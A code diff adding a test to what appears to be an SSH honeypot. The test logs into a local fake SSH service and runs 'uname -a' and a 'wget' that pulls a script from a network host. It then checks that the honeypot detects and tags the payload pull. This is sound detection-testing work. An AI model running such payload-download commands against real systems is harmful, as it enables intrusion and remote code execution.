@@ -132,3 +132,33 @@ def test_ssh_weak_cred_accepted_immediately(tmp_path):
     assert len(creds) == 1
     assert creds[0]["request"]["accepted"] is True
     assert [e for e in events if "ssh-bruteforce" in e.get("tags", [])] == []
+
+
+def test_ssh_shell_captures_commands_and_payload_pull(tmp_path):
+    log = tmp_path / "e.jsonl"
+    sink = EventSink(session="t", log_path=log, echo=False)
+    svc = SshService(cfg={"port": 0, "accept_after": 1, "bruteforce_threshold": 99},
+                     sink=sink, bind_address="127.0.0.1", data_dir=tmp_path, tls={})
+
+    async def scenario():
+        await svc.start()
+        port = svc._server.get_port()
+        async with asyncssh.connect("127.0.0.1", port, username="root",
+                                    known_hosts=None,
+                                    client_factory=_client(["root"])) as conn:
+            r1 = await conn.run("uname -a")
+            r2 = await conn.run("wget http://10.0.0.9/x.sh")
+            assert r1.stdout.strip().startswith("Linux")
+            assert r2.exit_status == 0
+        await svc.stop()
+
+    asyncio.run(scenario())
+    sink.close()
+    events = _wait_for_events(log)
+    cmds = [e for e in events if e.get("request", {}).get("command")]
+    assert any(e["request"]["command"] == "uname -a" for e in cmds)
+    pull = [e for e in events if "ssh-payload-pull" in e.get("tags", [])]
+    assert pull, "no ssh-payload-pull signal"
+    assert pull[0]["request"]["tool"] == "wget"
+    assert pull[0]["request"]["url"] == "http://10.0.0.9/x.sh"
+    assert pull[0]["service"] == "ssh"
